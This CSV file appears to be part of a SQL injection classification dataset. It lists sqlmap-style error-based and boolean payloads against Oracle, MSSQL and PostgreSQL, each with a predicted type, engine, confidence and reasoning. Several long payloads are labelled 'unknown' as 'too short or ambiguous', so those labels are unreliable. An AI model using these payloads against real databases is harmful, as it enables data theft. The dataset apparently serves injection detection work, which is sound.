id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
36733,"select * from users WHERE username = ""1\' ) ) ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( \'ugoz\' = \'ugoz"" and username = ""1\'+ ( select \'ueak\' where 7329 = 7329",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
36734,"select * from users WHERE username = ""1 ) ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( 6659 = 6659"" or username = ""1\' ) as wpmv where 1479 = 1479",error_based,oracle,1.0,"Token 'ctxsys.' → error_based (priority 4); DB=oracle. Evidence in payload: select * from users WHERE username = ""1 ) ) and 6055 = ctxsy",3
36735,"1\' and username = ""1%\' ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( \'%\' = \'",error_based,oracle,1.0,"Token 'xmltype (' → error_based (priority 4); DB=oracle. Evidence in payload: 1\' and username = ""1%\' ) and 3754 = ( select upper ( xmlty",3
36736,-5352%\' ) ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( \'%\' = \',unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
36737,"select * from users WHERE username = ""1\' ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( \'qtul\' like \'qtul"" and username = ""1 ) )",error_based,oracle,1.0,"Token 'xmltype (' → error_based (priority 4); DB=oracle. Evidence in payload: select * from users WHERE username = ""1\' ) ) and 3754 = ( s",3
36738,-3859 ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( 5846 = 5846,unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
36739,1\'+ ( select onzd where 8452 = 8452 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) ) +\',unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
36740,"select * from users WHERE username = ""1\'+ ( select \'kicv\' where 1976 = 1976 or username = ""1%\' ) ) ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) )",error_based,oracle,1.0,"Token 'ctxsys.' → error_based (priority 4); DB=oracle. Evidence in payload: select * from users WHERE username = ""1\'+ ( select \'kicv\'",3
36741,1\'+ ( select \'iqxn\' where 1146 = 1146 and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) ) +\',unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
36742,"select * from users WHERE username = ""-6036 ) ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( 6723 = 6723"" and username = ""-6244\' ) as szpd where 8445 = 8445",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
36743,"select * from users WHERE username = ""-9840\' ) ) or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( \'dzlp\' = \'dzlp"" and username = ""-6222 ) )",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
